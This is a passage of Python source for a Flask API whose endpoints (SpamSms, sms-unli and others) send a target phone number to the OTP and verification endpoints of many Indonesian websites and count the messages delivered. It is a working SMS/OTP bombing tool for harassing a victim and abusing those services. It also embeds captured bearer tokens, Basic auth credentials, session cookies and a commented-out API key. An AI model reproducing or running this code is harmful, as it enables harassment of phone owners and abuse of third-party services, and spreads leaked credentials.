"Chromium";v="105"','x-device-info':'{"platform":"web","is_app":false,"is_mobile":true,"device_type":"mobile","device_id":"LWUOU5jfEtY_43IsmFme_","os_name":"Android","os_version":"11","brand":null,"model":null,"client_ip":"::ffff:10.10.213.33","pixel_density":2}','sec-ch-ua-mobile':'?1','authorization':'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyMzc3NTA5LCJleHAiOjE2NjQ5Njk1MDksImlhdCI6MTY2MjM3NzUwOSwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjFmOWE0NGI0LTE0MTgtNGIyNC1iYTRkLWU0MTEwN2FjOWU2NSIsInN1YiI6IjRwZUpiTjB5cUpuQkd4NDBfMGVWbWV1S3lkYWQiLCJ1c2VyX2lkIjoiNHBlSmJOMHlxSm5CR3g0MF8wZVZtZXVLeWRhZCJ9.jgaFjb95AibZL_GegkpMlRWkV1epP4zMUfSbCZEbY7BYwIQjBb3eZn8QVi8OMBn8ejYz1o3zn6JM0gRqFtiH1CsCwIyr9gSQuTwUn_pHhaJNE6-i2omxAA94MY8T7kHNyEV0kE50yx2-oT0gMWF2BWt65tUjFfV_29qx9RajFlV8z75iQ78JTtm595jd3--zWBrCyUzDy994w2Hwm5keGlBZuwDKPPofBPI7fsqMdouLIzjXVHrU5t_tA8Pij5QPqia9hW2W0BTlSSWc8wf6CELMKheFA3P8bvxlgCCVQ4WckdPH3iS_pglVAqeHW5z8nJxYnPKmvIzuPucoZlPyfg','content-type':'application/json','accept':'*/*','x-bundle-revision':'6.0','x-sbox-tenant':'sayurbox','x-binary-version':'2.2.1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://www.sayurbox.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=last).text
        kum = requests.post("https://graphql-v4.kumparan.com/query",headers={"Host":"graphql-v4.kumparan.com","content-length":"179","accept":"*/*","content-type":"text/plain","env-client":"d52f487fa02230a23dbdc6e5a67545ddc59e4766d0a326d3f4a814b74ecc045e9382fed825b0d75ec7fa16588a50d75d","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://m.kumparan.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.kumparan.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"operationName":"CreateOTPAndSendSMS","variables":{"phone":nomor},"query":"mutation CreateOTPAndSendSMS($phone: String!) {\n  CreateOTPAndSendSMS(phone: $phone)\n}\n"})).text
        poss = requests.post("https://ua.ctcorpmpc.com/blade-user/api/user/getotp",headers={"Host":"ua.ctcorpmpc.com","Connection":"keep-alive","Content-Length":"148","Blade-Auth":"Bearer 22222","sec-ch-ua-mobile":"?1","Authorization":"Basic c3dvcmQ6c3dvcmRfc2VjcmV0","Content-Type":"application/json;charset=UTF-8","User-Agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","X-requested-With":"XMLHttpRequest","Tenant-Id":"000000","sec-ch-ua-platform":"Android","Accept":"*/*","Origin":"https://ua.ctcorpmpc.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://ua.ctcorpmpc.com/cas-web/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNo":nomor,"tplId":"4001001","tms":1662434407722,"requestId":"6e1b8c1c-fe2f-4418-851b-d31af02f0c221662434407722","intlPhoneCode":"62"})).text
        why=requests.post("https://www.misteraladin.com/api/members/v2/otp/request",headers={'Host':'www.misteraladin.com','content-length':'81','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','accept-language':'id','sec-ch-ua-mobile':'?0','authorization':'Bearer null','content-type':'application/json;charset=UTF-8','accept':'application/json, text/plain, */*','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36','x-platform':'web','sec-ch-ua-platform':'"Linux"','origin':'https://www.misteraladin.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.misteraladin.com/register','accept-encoding':'gzip, deflate, br',},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})).text
        poll=requests.post("https://api.myfave.com/api/fave/v3/auth",headers={'Host':'api.myfave.com','Connection':'keep-alive','Content-Length':'26','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-user-agent':'Fave-PWA/v1.0.0','content-type':'application/json','sec-ch-ua-mobile':'?1','User-Agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','Accept':'*/*','Origin':'https://myfave.com','Sec-Fetch-Site':'same-site','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://myfave.com/','Accept-Encoding':'gzip, deflate, br','Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"phone":"+62"+nomor})).text
        reqi=requests.post("https://auth.sampingan.co/v1/otp",data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor}),headers={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}).text
        pospp=requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"120","sec-ch-ua-mobile":"?0","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYTQyNDMyZDctZjI5NS00Zjk0LTllYTYtZjlkZmM0ZDgwY2RiIiwiaWF0IjoxNjU3MTI0OTQwLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.4j37JW_U6DVynJ0wCxHmVNI8SbpsaeUgqk3SEihJmvs","content-type":"application/json","x-company-name":"odi","accept":"application/json","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","user-platform":"desktop","x-frontend-type":"desktop","sec-ch-ua-platform":"Linux","origin":"https://www.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+nomor,"action":"register","channel":"message","email":"","token":"","customer_id":"0","is_resend":0})).text
        done = 0
        die = 0
        if "PENDING" in AmmarGanz:
            done += 1
        else:
            die += 1
        if "success" in map:
            done += 1
        else:
            die += 1
        if "ok" in dekor2:
            done += 1
        else:
            die += 1
        if "ForgeRockTokensResult" in jenius:
            done += 1
        else:
            die += 1
        if "success" in req3:
            done += 1
        else:
            die += 1
        if "!" in pizzahut:
            done += 1
        else:
            die += 1
        if "OK" in bli:
            done += 1
        else:
            die += 1
        if "If your phone number is not registered, you will receive an OTP" in ha:
            done += 1
        else:
            die += 1
        if "Send successfully" in pos:
	        done += 1
        else:
	        die += 1
        if "Evermos OTP" in req:
	        done += 1
        else:
	        die += 1
        if "<Response [200]>" in response:
	        done += 1
        else:
	        die += 1
        if "MESSAGE_SENT" in singsing:
	        done += 1
        else:
	        die += 1
        if "success create accounts" in posting:
	        done += 1
        else:
	        die += 1
        if "AuthIDResponseType" in ammar_gamteng:
	        done += 1
        else:
	        die += 1
        if "true" in kum:
	        done += 1
        else:
	        die += 1
        if "send international sms success" in poss:
	        done += 1
        else:
            die += 1
        if "error" in why:
	        die += 1
        else:
	        done += 1
        if "We can't process your request now. Please try again later or contact customer support." in poll:
	        die += 1
        else:
	        done += 1
        if "BAD_REQ" in reqi:
	        die += 1
        else:
	        done += 1
        if "Kode verifikasi berhasil dikirimkan" in pospp:
            done += 1
        else:
	        die += 1
        time.sleep(5)
        return ({"data":[{"errors":"false","message":"success","code":200,"xsrf":dom,"channel":"sms","total_masuk":done,"total_gagal":die}]})

class Unli(Resource):
    def post(self):
        useragent=UserAgent()
        ua=useragent.random
        #apikey="5ubR3k4mm@RExCut3Dj18YUauHaooa9w82i"
        nomor=request.form.get('nomor')
        #apikey=request.form.get('apikey')
        #if "5ubR3k4mm@RExCut3Dj18YUauHaooa9w82i" in apikey:
        head={    'authority': 'www.oto.com',    'accept': 'application/json, text/javascript, */*; q=0.01',    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',    'origin': 'https://www.oto.com',    'referer': 'https://www.oto.com/ovb/user-login',    'sec-ch-ua': '"Chromium";v="105", "Not)A;Brand";v="8"',    'sec-ch-ua-mobile': '?0',    'sec-ch-ua-platform': '"Linux"',    'sec-fetch-dest': 'empty',    'sec-fetch-mode': 'cors',    'sec-fetch-site': 'same-origin',    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',    'x-requested-with': 'XMLHttpRequest',}
        response = requests.post('https://www.oto.com/ovb/send-otp', params={    'lang': 'id',}, cookies={    'primary_utm_campaign': 'organic',    'primary_utm_medium': 'organic',    'primary_utm_source': 'yahoo',    'utm_campaign': 'organic',    'utm_medium': 'organic',    'utm_source': 'yahoo',    'landing_url': 'https%3A%2F%2Fwww.oto.com%2F',    '_csrf': 'aG2nJALlO7VyltTb-atrM-_EXaThOQri',    'GCLB': 'CPH61KyGt9yB2wE',    '_gcl_au': '1.1.60394401.1662191705',    '_pbjs_userid_consent_data': '3524755945110770',    'pbjs-pubCommonId': '0c3d7536-4c41-4e8c-8078-ede03a294dfe',    '_ga': 'GA1.2.1220515766.1662191705',    '_gid': 'GA1.2.525526430.1662191705',    '_gat': '1',    '_co_session_active': '1',    '_CO_anonymousId': '65ad5b8b-31fe-0728-c3ce-e208c717c122',    '_CO_type': 'connecto',    '_fbp': 'fb.1.1662191705704.1893770966',    '_dc_gtm_UA-58094033-8': '1',    '_lr_retry_request': 'true',    '_lr_env_src_ats': 'false',    '__gads': 'ID=0d3fa2b6107a5244:T=1662191707:S=ALNI_MbMDDAdViTY4nYB086vSjMp8axBUw',    '__gpi': 'UID=0000096baa896e74:T=1662191707:RT=1662191707:S=ALNI_MbpMPTZyUO8x5wnAh3T1Qq5rVKPDw',    'pubmatic-unifiedid': '%7B%22TDID%22%3A%22b8d808f8-e3d6-4b01-bfb5-34a077fe952a%22%2C%22TDID_LOOKUP%22%3A%22TRUE%22%2C%22TDID_CREATED_AT%22%3A%222022-08-03T07%3A55%3A08%22%7D',    'panoramaId_expiry': '1662796507670',    '_cc_id': 'a270b7341af8c173e8f2aa3f71b7accd',    'panoramaId': '3cc178a793a7f2c651c73fe7475c16d53938dce698845cc3fb7fea782d2fbcf3',    'pbjs_debug': '0',    'page_view': '1',    'cto_bidid': 'ilf0CV9KN1ZCRzExY1NYMXNqVmclMkJlZ3k4azlIem9NbHhaa1pXYWlCQlhmJTJCVjdCMGhwOUhkRWV4UTNoOFhMbjVLaXpUT2JiN24yNEhCOER6RDZuVFVpSWpYdVElM0QlM0Q',    'cto_bundle': 'yx0Sy185U09IckR1WW4waUNkSmpoY1VFMGdVa2dZSk1VdEYlMkY2bSUyQmhDSG0lMkJ2ZFRUR0FPaG5nTHFrY1ZiQ2IzSGtodmE5dWExeDVNdllUcW1tMXFmMnQ2WUQwZVc1dEREaGJjZ1ZhVzlDZmpzWlQzayUzRA',}, headers=head, data={    'mobile': nomor,    'bookingId': '0',    'businessUnit': 'mobil',}).text
        if "true" in response:
            return (
            {
                "mssg":"success",
                "user-agent":ua,
                "code":200
            }
        )
        else:
            return (
            {
                "mssg":"access denied",
                "user-agent":ua,
                "code":200
            }
        )

api.add_resource(TestingSource, "/first", methods=["GET", "POST", "DELETE"])
api.add_resource(UpdateSource, "/first/<id>", methods=["PUT","DELETE"])
api.add_resource(RandomUa, "/first/api/user-agent", methods=["GET"])
api.add_resource(SpamSource, "/first/api/sms")
api.add_resource(InstaFoll, "/first/api/instafol")
api.add_resource(SpamSms, "/first/api/spamsms")
api.add_resource(Unli, "/first/api/sms-unli")

if __name__ == "__main__":
    app.run(debug=True,port=5005)
